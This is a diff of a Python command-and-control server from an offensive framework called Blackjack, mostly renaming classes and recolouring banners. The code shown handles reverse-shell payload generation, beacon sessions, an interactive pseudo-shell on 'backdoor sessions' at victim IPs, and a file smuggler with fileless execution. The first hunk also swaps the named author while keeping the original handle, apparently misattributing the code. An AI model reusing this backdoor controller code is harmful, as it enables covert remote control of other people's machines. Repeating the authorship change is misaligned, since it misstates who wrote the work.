@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 #
-# Author: Panagiotis Chartas (r0jahsm0ntar1)
+# Author: Rojahs Montari (r0jahsm0ntar1)
 #
-# This script is part of the blackjack framework:
-# https://github.com/r0jahsm0ntar1/blackjack
+# This script is part of the Blackjack framework:
+# https://github.com/r0jahsm0ntar1/africana-framework
 
 
 import ssl, socket, struct
@@ -33,7 +33,7 @@ class Payload_Generator:
 
         self.obfuscator = Obfuscator()
 
-        # blackjack
+        # BlackJack
         self.constraint_mode_support = ['cmd-curl', 'ps-iex-cm', 'ps-outfile-cm', 'cmd-curl-ssl', 'ps-iex-cm-ssl', 'ps-outfile-cm-ssl', 'sh-curl', 'sh-curl-ssl']
         self.exec_outfile_support = ['ps-outfile', 'ps-outfile-cm', 'ps-outfile-ssl', 'ps-outfile-cm-ssl']
 
@@ -82,11 +82,11 @@ class Payload_Generator:
 
     def compute_blackjack(self, payload, user_args):
 
-        # Create session unique id if type == blackjack
+        # Create session unique id if type == BlackJack
         verify = uuid4().hex[0:6]
         get_cmd = uuid4().hex[0:6]
         post_res = uuid4().hex[0:6]
-        header_id = 'Authorization' if not blackjack_Settings._header else blackjack_Settings._header
+        header_id = 'Authorization' if not Blackjack_Settings._header else Blackjack_Settings._header
         session_unique_id = '-'.join([verify, get_cmd, post_res])
         exec_outfile = True if payload.meta['type'] in self.exec_outfile_support else False
 
@@ -102,15 +102,15 @@ class Payload_Generator:
         }
 
         # Store legit session metadata (used to restore previously established sessions)
-        blackjack_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])
+        BlackJack_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])
 
         # Set lhost port
-        lhost = f"{payload.parameters['lhost']}:{blackjack_Settings.bind_port}" if not blackjack_Settings.ssl_support \
-                else f"{payload.parameters['lhost']}:{blackjack_Settings.bind_port_ssl}"
+        lhost = f"{payload.parameters['lhost']}:{Blackjack_Settings.bind_port}" if not Blackjack_Settings.ssl_support \
+                else f"{payload.parameters['lhost']}:{Blackjack_Settings.bind_port_ssl}"
 
         # Process payload template
         payload.data = payload.data.replace('*LHOST*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
-            payload.config["frequency"])).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
+            payload.config["frequency"])).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*BLACKJACKID*', header_id).strip()
 
         # Parse outfile
         if exec_outfile:
@@ -565,13 +565,13 @@ class Sessions_Manager:
     sessions_graveyard = []
     aliases = []
 
-    # blackjack
+    # Blackjack
     verify = []
     get_cmd = []
     post_res = []
 
     # Load past generated legit session payload details (if beacon is still alive they may be re-establish)
-    past_generated_sessions = blackjack_Implants_Logger.retrieve_past_sessions_data()
+    past_generated_sessions = BlackJack_Implants_Logger.retrieve_past_sessions_data()
 
     if past_generated_sessions:
 
@@ -748,7 +748,7 @@ class Sessions_Manager:
                 self.sessions_graveyard.append(session_id)
 
                 #if self.active_sessions[session_id]['Status'] != 'Lost':
-                blackjack.dropSession(session_id)
+                Blackjack.dropSession(session_id)
 
                 if self.active_sessions[session_id]['Listener'] == 'blackjack':
                     sleep(self.active_sessions[session_id]['frequency'])
@@ -759,7 +759,7 @@ class Sessions_Manager:
 
                 self.active_sessions.pop(session_id, None)
                 #self.legit_session_ids.pop(session_id, None) 
-                del blackjack.command_pool[session_id]
+                del Blackjack.command_pool[session_id]
 
                 print(f'[{INFO}] Session terminated.')
                 Core_Server.announce_session_termination({'session_id' : session_id})
@@ -772,23 +772,23 @@ class Sessions_Manager:
 
 
 
-# -------------- blackjack Server -------------- #
-class blackjack(BaseHTTPRequestHandler):
+# -------------- Blackjack Server -------------- #
+class Blackjack(BaseHTTPRequestHandler):
 
-    server_name = f'-[{GREEN}   blackjack Multi-Handler     {END}]-'
-    header_id = blackjack_Settings._header
+    server_name = f'{BLUE}   [   {DARKCYAN}BlackJack Multi-Handler{END}    {BLUE}]{END}'
+    header_id = Blackjack_Settings._header
     server_unique_id = None
     command_pool = {}
 
     # Shell
     active_shell = None
     prompt_ready = False
-    afric_prompt = None
+    blackjack_prompt = None
 
 
     @staticmethod
     def set_shell_prompt_ready():
-        blackjack.prompt_ready = True
+        Blackjack.prompt_ready = True
 
 
     @staticmethod
@@ -834,7 +834,7 @@ class blackjack(BaseHTTPRequestHandler):
                     output = None
 
             # Check if command was issued by a sibling server
-            sibling_signature = blackjack.search_output_for_signature(output)
+            sibling_signature = Blackjack.search_output_for_signature(output)
 
             if sibling_signature:
                 output = output.replace('{' + sibling_signature + '}', '')
@@ -878,16 +878,16 @@ class blackjack(BaseHTTPRequestHandler):
 
         # Define prompt value:
         if prompt:
-            blackjack.afric_prompt = prompt
+            Blackjack.blackjack_prompt = prompt
 
         else:
-            blackjack.afric_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
+            Blackjack.blackjack_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
 
-        blackjack.active_shell = session_id
-        blackjack.prompt_ready = True
+        Blackjack.active_shell = session_id
+        Blackjack.prompt_ready = True
 
         # Print pseudo-shell info
-        activation_msg = f'{BLUE}       -[ Interactive pseudo-shell activated. ]-{END}\n  -[ Press Ctrl + C or type "exit" to deactivate ]-\n'
+        activation_msg = 'Interactive pseudo-shell activated.\nPress Ctrl + C or type "exit" to deactivate.\n'
         stable = True if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Stable' else False
 
         if not stable:
@@ -898,10 +898,10 @@ class blackjack(BaseHTTPRequestHandler):
         # Pseudo shell
         try:
 
-            while blackjack.active_shell:
+            while Blackjack.active_shell:
 
-                if blackjack.prompt_ready:
-                    user_input = input(blackjack.afric_prompt)
+                if Blackjack.prompt_ready:
+                    user_input = input(Blackjack.blackjack_prompt)
                     user_input_clean = re.sub(' +', ' ', user_input).strip()
                     cmd_list = user_input_clean.split(' ')
                     cmd_list[0] = cmd_list[0].lower()
@@ -914,7 +914,7 @@ class blackjack(BaseHTTPRequestHandler):
 
                     elif cmd_list[0] == 'upload':
 
-                        blackjack.prompt_ready = False
+                        Blackjack.prompt_ready = False
                         file_path = os.path.expanduser(cmd_list[1])
 
                         if session_id in Sessions_Manager.active_sessions.keys():
@@ -938,7 +938,7 @@ class blackjack(BaseHTTPRequestHandler):
 
                             else:
                                 print(f'\r[{ERR}] file {file_path} not found.')
-                                blackjack.set_shell_prompt_ready()
+                                Blackjack.set_shell_prompt_ready()
 
 
 
@@ -982,8 +982,8 @@ class blackjack(BaseHTTPRequestHandler):
                     # Run as shell command
                     else:
 
-                        if blackjack.active_shell:
-                            blackjack.prompt_ready = False
+                        if Blackjack.active_shell:
+                            Blackjack.prompt_ready = False
 
                             # Invoke Session Defender to inspect the command for dangerous input
                             dangerous_input_detected = False
@@ -1005,7 +1005,7 @@ class blackjack(BaseHTTPRequestHandler):
                                     Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, user_input)
 
                                 else:
-                                    blackjack.command_pool[blackjack.active_shell].append(user_input)
+                                    Blackjack.command_pool[Blackjack.active_shell].append(user_input)
 
 
                         else:
@@ -1020,18 +1020,18 @@ class blackjack(BaseHTTPRequestHandler):
 
 
         except KeyboardInterrupt:
-            blackjack.command_pool[blackjack.active_shell] = []
+            Blackjack.command_pool[Blackjack.active_shell] = []
             print('\r')
-            blackjack.deactivate_shell()
+            Blackjack.deactivate_shell()
 
 
 
     @staticmethod
     def deactivate_shell():
 
-        blackjack.active_shell = None
-        blackjack.prompt_ready = False
-        blackjack.afric_prompt = None
+        Blackjack.active_shell = None
+        Blackjack.prompt_ready = False
+        Blackjack.blackjack_prompt = None
         Main_prompt.ready = True
 
 
@@ -1039,8 +1039,8 @@ class blackjack(BaseHTTPRequestHandler):
     @staticmethod
     def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
 
-        blackjack.prompt_ready = True
-        sys.stdout.write(prefix + blackjack.afric_prompt + global_readline.get_line_buffer())
+        Blackjack.prompt_ready = True
+        sys.stdout.write(prefix + Blackjack.blackjack_prompt + global_readline.get_line_buffer())
 
 
 
@@ -1049,12 +1049,12 @@ class blackjack(BaseHTTPRequestHandler):
         timestamp = int(datetime.now().timestamp())
 
         # Identify session
-        if not blackjack.header_id:
+        if not Blackjack.header_id:
             header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
-            blackjack.header_id = f'X-{header_id_extract[0]}'
+            Blackjack.header_id = f'X-{header_id_extract[0]}'
 
         try:
-            session_id = self.headers.get(blackjack.header_id)
+            session_id = self.headers.get(Blackjack.header_id)
 
         except:
             session_id = None
@@ -1076,7 +1076,7 @@ class blackjack(BaseHTTPRequestHandler):
                     'last_received' : timestamp,
                     'OS Type' : Sessions_Manager.legit_session_ids[session_id]['OS Type'],
                     'frequency' : Sessions_Manager.legit_session_ids[session_id]['frequency'],
-                    'Owner' : blackjack.server_unique_id,
+                    'Owner' : Blackjack.server_unique_id,
                     'self_owned' : True,
                     'aliased' : False,
                     'alias' : None,
@@ -1087,7 +1087,7 @@ class blackjack(BaseHTTPRequestHandler):
                     'Stability' : 'Unstable'
                 }
 
-                blackjack.command_pool[session_id] = []
+                Blackjack.command_pool[session_id] = []
 
         elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):
             Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
@@ -1096,15 +1096,15 @@ class blackjack(BaseHTTPRequestHandler):
         elif not session_id:
             return
 
-        self.server_version = blackjack_Settings.server_version
+        self.server_version = Blackjack_Settings.server_version
         self.sys_version = ""
-        session_id = self.headers.get(blackjack.header_id)
+        session_id = self.headers.get(Blackjack.header_id)
         legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False
 
 
         # Verify execution
         # url_split = self.path.strip("/").split("/")
-        # if url_split[0] in blackjack.verify and legit:
+        # if url_split[0] in Blackjack.verify and legit:
 
         url_split = self.path.strip("/").split("/")
 
@@ -1154,14 +1154,14 @@ class blackjack(BaseHTTPRequestHandler):
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
 
-            if len(blackjack.command_pool[session_id]):
+            if len(Blackjack.command_pool[session_id]):
 
                 blackjack_issued_cmd = False
-                cmd = blackjack.command_pool[session_id].pop(0)
+                cmd = Blackjack.command_pool[session_id].pop(0)
 
                 # Check command type:
                 # type str = normal
-                # type dict = blackjack issued cmd
+                # type dict = Blackjack issued cmd
 
                 if isinstance(cmd, dict):
                     # blackjack_issued_cmd = True
@@ -1196,7 +1196,7 @@ class blackjack(BaseHTTPRequestHandler):
 
             try:
                 Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
-                self.server_version = blackjack_Settings.server_version
+                self.server_version = Blackjack_Settings.server_version
                 self.sys_version = ""
 
                 # cmd output
@@ -1220,7 +1220,7 @@ class blackjack(BaseHTTPRequestHandler):
                                     return
 
                                 print(f'\r{GREEN}{output}{END}') if output else chill()
-                                Main_prompt.set_main_prompt_ready() if not self.active_shell else blackjack.set_shell_prompt_ready()
+                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Blackjack.set_shell_prompt_ready()
 
                             elif isinstance(output, list):
                                 if not isinstance(output[1], int):
@@ -1235,7 +1235,7 @@ class blackjack(BaseHTTPRequestHandler):
 
                         if isinstance(output, str):
                             print(error_msg)
-                            Main_prompt.set_main_prompt_ready() if not self.active_shell else blackjack.set_shell_prompt_ready()
+                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Blackjack.set_shell_prompt_ready()
 
                         elif isinstance(output, list):
                             try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, None, session_id, True], 'command_output', 30)
@@ -1258,13 +1258,13 @@ class blackjack(BaseHTTPRequestHandler):
 
     def do_OPTIONS(self):
 
-        self.server_version = blackjack_Settings.server_version
+        self.server_version = Blackjack_Settings.server_version
         self.sys_version = ""
         self.send_response(200)
         self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
         self.send_header('Vary', "Origin")
         self.send_header('Access-Control-Allow-Credentials', 'true')
-        self.send_header('Access-Control-Allow-Headers', blackjack_Settings.header_id)
+        self.send_header('Access-Control-Allow-Headers', Blackjack_Settings.header_id)
         self.end_headers()
         self.wfile.write(b'OK')
 
@@ -1284,16 +1284,16 @@ class blackjack(BaseHTTPRequestHandler):
             exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
 
             if Sessions_Manager.active_sessions[session_id]['Shell'] == 'cmd.exe':
-                blackjack.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
+                Blackjack.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
                 
             elif (os_type == 'Windows' and not outfile) or os_type == 'Linux':
-                blackjack.command_pool[session_id].append({'data' : exit_command, 'issuer' : 'self', 'quiet' : True})
+                Blackjack.command_pool[session_id].append({'data' : exit_command, 'issuer' : 'self', 'quiet' : True})
 
             elif os_type == 'Windows' and outfile:
-                blackjack.command_pool[session_id].append({'data' : 'quit', 'issuer' : 'self', 'quiet' : True})
+                Blackjack.command_pool[session_id].append({'data' : 'quit', 'issuer' : 'self', 'quiet' : True})
 
         elif Sessions_Manager.active_sessions[session_id]['Listener'] == 'netcat':
-            blackjack.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
+            Blackjack.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
 
 
 
@@ -1312,7 +1312,7 @@ class blackjack(BaseHTTPRequestHandler):
                 try:
                     if Sessions_Manager.active_sessions[session_id]['Owner'] == Core_Server.SERVER_UNIQUE_ID:
                         Sessions_Manager.sessions_graveyard.append(session_id)
-                        blackjack.dropSession(session_id)
+                        Blackjack.dropSession(session_id)
                         #Core_Server.announce_session_termination({'session_id' : session_id})
 
                 except:
@@ -1357,7 +1357,7 @@ class blackjack(BaseHTTPRequestHandler):
                         'Status' : Sessions_Manager.active_sessions[session_id]['Status']
                     })
 
-                sleep(blackjack_Settings.monitor_shell_state_freq)
+                sleep(Blackjack_Settings.monitor_shell_state_freq)
 
             else:
                 Threading_params.thread_limiter.release()
@@ -1365,55 +1365,55 @@ class blackjack(BaseHTTPRequestHandler):
 
 
 
-def initiate_afric_server():
+def initiate_blackjack_server():
 
     try:
 
         # Check if both cert and key files were provided
-        if (blackjack_Settings.certfile and not blackjack_Settings.keyfile) or \
-            (blackjack_Settings.keyfile and not blackjack_Settings.certfile):
+        if (Blackjack_Settings.certfile and not Blackjack_Settings.keyfile) or \
+            (Blackjack_Settings.keyfile and not Blackjack_Settings.certfile):
             exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
 
         # Start http server
-        port = blackjack_Settings.bind_port if not blackjack_Settings.ssl_support else blackjack_Settings.bind_port_ssl
+        port = Blackjack_Settings.bind_port if not Blackjack_Settings.ssl_support else Blackjack_Settings.bind_port_ssl
 
         try:
-            httpd = HTTPServer((blackjack_Settings.bind_address, port), blackjack)
+            httpd = HTTPServer((Blackjack_Settings.bind_address, port), Blackjack)
 
         except OSError:
-            exit(f'[{DEBUG}] {blackjack.server_name} failed to start. Port {port} seems to already be in use.\n')
+            exit(f'[{DEBUG}] {Blackjack.server_name} failed to start. Port {port} seems to already be in use.\n')
 
         except:
-            exit(f'\n[{DEBUG}] {blackjack.server_name} failed to start (Unknown error occurred).\n')
+            exit(f'\n[{DEBUG}] {Blackjack.server_name} failed to start (Unknown error occurred).\n')
 
-        if blackjack_Settings.ssl_support:
+        if Blackjack_Settings.ssl_support:
             httpd.socket = ssl.wrap_socket (
                 httpd.socket,
-                keyfile = blackjack_Settings.keyfile,
-                certfile = blackjack_Settings.certfile,
+                keyfile = Blackjack_Settings.keyfile,
+                certfile = Blackjack_Settings.certfile,
                 server_side = True,
                 ssl_version=ssl.PROTOCOL_TLS
             )
 
 
-        blackjack_server = Thread(target = httpd.serve_forever, args = (), name = 'blackjack_server')
-        blackjack_server.daemon = True
-        blackjack_server.start()
+        Blackjack_server = Thread(target = httpd.serve_forever, args = (), name = 'blackjack_server')
+        Blackjack_server.daemon = True
+        Blackjack_server.start()
         registered_services.append({
-            'service' : blackjack.server_name, 
-            'socket' : f'{ORANGE}{blackjack_Settings.bind_address}{END}:{RED}{port}{END}'
+            'service' : Blackjack.server_name, 
+            'socket' : f'{ORANGE}{Blackjack_Settings.bind_address}{END}:{ORANGE}{port}{END}'
         })
-        print(f'[{ORANGE}{blackjack_Settings.bind_address}{END}:{RED}{port}{END}]::{blackjack.server_name}')
+        print(f'[{ORANGE}{Blackjack_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Blackjack.server_name}')
 
 
     except KeyboardInterrupt:
-        blackjack.terminate()
+        Blackjack.terminate()
 
 
 
 class Core_Server:
 
-    server_name = f'-[{GREEN}        Team Server            {END}]-'
+    server_name = f'{BLUE}   [   {DARKCYAN}Team Server{END}                {BLUE}]{END}'
     acknowledged_servers = []
     sibling_servers = {}
     requests = {}
@@ -1435,6 +1435,7 @@ class Core_Server:
 
     def sock_handler(self, conn, address):
 
+        raw_data = str_data = None
         try:
 
             Threading_params.thread_limiter.acquire()
@@ -1556,7 +1557,7 @@ class Core_Server:
 
                         # Check if session exists
                         if data['session_id'] in Sessions_Manager.active_sessions.keys():
-                            blackjack.command_pool[data['session_id']].append(data['command'])
+                            Blackjack.command_pool[data['session_id']].append(data['command'])
                             Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
 
@@ -1578,8 +1579,8 @@ class Core_Server:
                         if prompt_value:
                             Sessions_Manager.active_sessions[session_id]['prompt'] = prompt_value
 
-                            if blackjack.active_shell == session_id:
-                                blackjack.afric_prompt = prompt_value
+                            if Blackjack.active_shell == session_id:
+                                Blackjack.blackjack_prompt = prompt_value
 
                         Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1590,7 +1591,7 @@ class Core_Server:
 
 
                     elif decrypted_data[0] == 'active_shell_query':
-                        response = str(self.encapsulate_dict(blackjack.active_shell, 'session_id'))
+                        response = str(self.encapsulate_dict(Blackjack.active_shell, 'session_id'))
                         response_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response, sibling_id[0:16].encode('utf-8'))
                         Core_Server.send_msg(conn, response_encypted)
 
@@ -1626,14 +1627,14 @@ class Core_Server:
                     elif decrypted_data[0] == 'upload_file':
                         File_Smuggler.upload_file(decrypted_data[1][0], decrypted_data[1][1], decrypted_data[1][2], issuer = sibling_id)
                         Core_Server.send_msg(conn, self.response_ack(sibling_id))
-                        Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+                        Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
 
 
 
                     elif decrypted_data[0] == 'exec_file':
                         File_Smuggler.fileless_exec(decrypted_data[1][0], decrypted_data[1][1], issuer = sibling_id)
                         Core_Server.send_msg(conn, self.response_ack(sibling_id))
-                        Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+                        Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
 
 
 
@@ -1681,11 +1682,11 @@ class Core_Server:
                         Sessions_Manager.active_sessions.pop(decrypted_data[1]['session_id'], None)
                         print(f'\r[{INFO}] Backdoor session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
 
-                        if blackjack.active_shell == decrypted_data[1]['session_id']:
-                            blackjack.deactivate_shell()
+                        if Blackjack.active_shell == decrypted_data[1]['session_id']:
+                            Blackjack.deactivate_shell()
 
                         del victim_ip
-                        Main_prompt.rst_prompt() if not blackjack.active_shell else blackjack.rst_shell_prompt()
+                        Main_prompt.rst_prompt() if not Blackjack.active_shell else Blackjack.rst_shell_prompt()
                         Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
 
@@ -1743,8 +1744,8 @@ class Core_Server:
         conn.close()
 
         if rst_prompt:
-            Main_prompt.set_main_prompt_ready() if not blackjack.active_shell \
-            else blackjack.set_shell_prompt_ready()
+            Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell \
+            else Blackjack.set_shell_prompt_ready()
 
         del raw_data, str_data
         Threading_params.thread_limiter.release()
@@ -1793,10 +1794,10 @@ class Core_Server:
     @staticmethod
     def restore_prompt_after_lost_conn(session_id):
 
-        if blackjack.active_shell == session_id:
-            blackjack.deactivate_shell()
+        if Blackjack.active_shell == session_id:
+            Blackjack.deactivate_shell()
 
-        Main_prompt.rst_prompt() if not blackjack.active_shell else blackjack.rst_shell_prompt()
+        Main_prompt.rst_prompt() if not Blackjack.active_shell else Blackjack.rst_shell_prompt()
 
 
 
@@ -1818,9 +1819,9 @@ class Core_Server:
         self.core_initialized = True
         registered_services.append({
             'service' : self.server_name, 
-            'socket' : f'{ORANGE}{Core_Server_Settings.bind_address}{END}:{RED}{Core_Server_Settings.bind_port}{END}'
+            'socket' : f'{ORANGE}{Core_Server_Settings.bind_address}{END}:{ORANGE}{Core_Server_Settings.bind_port}{END}'
         })
-        print(f'\r[{ORANGE}{Core_Server_Settings.bind_address}{END}:{RED}{Core_Server_Settings.bind_port}{END}]::{self.server_name}')
+        print(f'\r[{ORANGE}{Core_Server_Settings.bind_address}{END}:{ORANGE}{Core_Server_Settings.bind_port}{END}]::{self.server_name}')
 
         # Start listening for connections
         server_socket.listen()
@@ -1996,7 +1997,7 @@ class Core_Server:
 
         if isinstance(shells_data, dict):
             for session_id in shells_data.keys():
-                if (session_id not in current_shells) and shells_data[session_id]['Owner'] != blackjack.server_unique_id:
+                if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Blackjack.server_unique_id:
                     shells_data[session_id]['alias'] = None
                     shells_data[session_id]['aliased'] = False
                     shells_data[session_id]['self_owned'] = False
@@ -2116,7 +2117,7 @@ class Core_Server:
         if initiator:
             Main_prompt.set_main_prompt_ready()
         else:
-            Main_prompt.rst_prompt() if not blackjack.active_shell else blackjack.rst_shell_prompt()
+            Main_prompt.rst_prompt() if not Blackjack.active_shell else Blackjack.rst_shell_prompt()
 
 
 
@@ -2189,7 +2190,7 @@ class Core_Server:
         # Check again if server in siblings
         if sibling_id not in Core_Server.sibling_servers.keys():
             print(f'\r[{ERR}] Failed to proxy the command. Connection with the sibling server may be lost.')
-            Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+            Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
             return
 
         if not isinstance(command, dict):
@@ -2227,9 +2228,9 @@ class Core_Server:
 
                         if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
                             # Check if active shell against a session that belongs to the lost sibling
-                            if blackjack.active_shell in Sessions_Manager.active_sessions.keys():
-                                if Sessions_Manager.active_sessions[blackjack.active_shell]['Owner'] == sibling_id:
-                                    blackjack.deactivate_shell()
+                            if Blackjack.active_shell in Sessions_Manager.active_sessions.keys():
+                                if Sessions_Manager.active_sessions[Blackjack.active_shell]['Owner'] == sibling_id:
+                                    Blackjack.deactivate_shell()
 
                             self.remove_all_sessions(sibling_id)
                             server_ip = self.sibling_servers[sibling_id]["Server IP"]
@@ -2280,7 +2281,7 @@ class Core_Server:
 
 class TCP_Sock_Multi_Handler:
 
-    server_name = f'-[{GREEN}   Netcat TCP Multi-Handler{END}    ]-'
+    server_name = f'{BLUE}   [   {DARKCYAN}Netcat TCP Multi-Handler{END}   {BLUE}]{END}'
     listen = True
     listener_initialized = None
 
@@ -2320,9 +2321,9 @@ class TCP_Sock_Multi_Handler:
         self.listener_initialized = True
         registered_services.append({
             'service' : self.server_name, 
-            'socket' : f'{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{RED}{TCP_Sock_Handler_Settings.bind_port}{END}'
+            'socket' : f'{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{ORANGE}{TCP_Sock_Handler_Settings.bind_port}{END}'
         })
-        print(f'\r[{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{RED}{TCP_Sock_Handler_Settings.bind_port}{END}]::{self.server_name}')
+        print(f'\r[{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{ORANGE}{TCP_Sock_Handler_Settings.bind_port}{END}]::{self.server_name}')
 
         # Start listening for connections
         nc_server.listen()
@@ -2480,7 +2481,7 @@ class TCP_Sock_Multi_Handler:
                     conn.close()
 
                     if not TCP_Sock_Handler_Settings.hostname_filter_warning_delivered:
-                        print_to_prompt(f'\r[{WARN}] A TCP reverse connection was rejected due to hostname validation failure. You can disable this filter by setting hostname_filter to False in blackjack/Core/settings.py. This warning will be muted for the rest of the session.')
+                        print_to_prompt(f'\r[{WARN}] A TCP reverse connection was rejected due to hostname validation failure. You can disable this filter by setting hostname_filter to False in Blackjack/Core/settings.py. This warning will be muted for the rest of the session.')
                         TCP_Sock_Handler_Settings.hostname_filter_warning_delivered = True
 
                     Threading_params.thread_limiter.release()
@@ -2511,7 +2512,7 @@ class TCP_Sock_Multi_Handler:
                 'last_received' : timestamp,
                 'OS Type' : os_type,
                 'frequency' : 1,
-                'Owner' : blackjack.server_unique_id,
+                'Owner' : Blackjack.server_unique_id,
                 'self_owned' : True,
                 'aliased' : False,
                 'alias' : None,
@@ -2532,7 +2533,7 @@ class TCP_Sock_Multi_Handler:
                 'exec_outfile' : False
             }
 
-            blackjack.command_pool[session_id] = []
+            Blackjack.command_pool[session_id] = []
             print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{address[0]}{END}')
             print_to_prompt(f'\r[{WARN}] Failed to resolve hostname. Use "repair" to declare it manually.') if hostname_undefined else chill()
 
@@ -2564,16 +2565,16 @@ class TCP_Sock_Multi_Handler:
 
             if session_id in sessions:
 
-                if blackjack.command_pool[session_id]:
+                if Blackjack.command_pool[session_id]:
 
-                    cmd = blackjack.command_pool[session_id].pop(0)
+                    cmd = Blackjack.command_pool[session_id].pop(0)
                     issuer, sibling_signature, quiet = 'self', False, False
                     shell = Sessions_Manager.active_sessions[session_id]['Shell']
                     prompt = Sessions_Manager.active_sessions[session_id]['prompt']
 
                     # Check command type:
                     # type str = Normal command
-                    # type dict = Command issued by blackjack's Utilities
+                    # type dict = Command issued by Blackjack's Utilities
 
                     if isinstance(cmd, dict):
                         blackjack_issued_cmd = True
@@ -2639,7 +2640,7 @@ class TCP_Sock_Multi_Handler:
                             Core_Server.restore_prompt_after_lost_conn(session_id)
 
                     del cmd
-                    #Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+                    #Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
 
                 else:
                     sleep(0.25)
@@ -2717,8 +2718,8 @@ class TCP_Sock_Multi_Handler:
                                 chunk = '' if not sentinel_value[1][0].strip() else sentinel_value[1][0].rstrip() + '\r'
                                 prompt_value = sentinel_value[1][1].lstrip()
 
-                                if blackjack.active_shell:
-                                    blackjack.afric_prompt = prompt_value
+                                if Blackjack.active_shell:
+                                    Blackjack.blackjack_prompt = prompt_value
 
                                 if session_id:
                                     # Sessions_Manager.active_sessions[session_id].update({'prompt' : prompt_value, 'Shell' : sentinel_value[2]})
@@ -2771,7 +2772,7 @@ class TCP_Sock_Multi_Handler:
         print('\n') if (not quiet and response.strip()) else chill()
 
         if issuer == 'self' and not quiet:
-            Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+            Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
 
         return self.clean_nc_response(response) if shell_type else response
 
@@ -3039,7 +3040,7 @@ class Session_Defender:
     @staticmethod
     def print_warning():
         print(f'[{WARN}] Dangerous input detected. This command may break the shell session. If you want to execute it anyway, disable the Session Defender by running "cmdinspector off".')
-        Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+        Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
 
 
 
@@ -3138,7 +3139,7 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 
         except:
             print(self.error_msg)
-            Main_prompt.set_main_prompt_ready() if not blackjack.active_shell else blackjack.set_shell_prompt_ready()
+            Main_prompt.set_main_prompt_ready() if not Blackjack.active_shell else Blackjack.set_shell_prompt_ready()
             pass
 
 
@@ -3149,7 +3150,7 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 
 class File_Smuggler:
 
-    server_name = f'-[{GREEN}    HTTP File Smuggler         {END}]-'
+    server_name = f'{BLUE}   [   {DARKCYAN}HTTP File Smuggler{END}         {BLUE}]{END}'
     file_transfer_tickets = {}
 
     def __init__(self):
@@ -3168,9 +3169,9 @@ class File_Smuggler:
         http_file_smuggler_server.start()
         registered_services.append({
             'service' : self.server_name, 
-            'socket' : f'{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{RED}{File_Smuggler_Settings.bind_port}{END}'
+            'socket' : f'{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{ORANGE}{File_Smuggler_Settings.bind_port}{END}'
         })
-        print(f'[{ORANGE}{File_Smuggler_Settings.bind_address}{END}:{RED}{File_Smuggler_Settings.bind_port}{END}]::{self.server_name}\n')
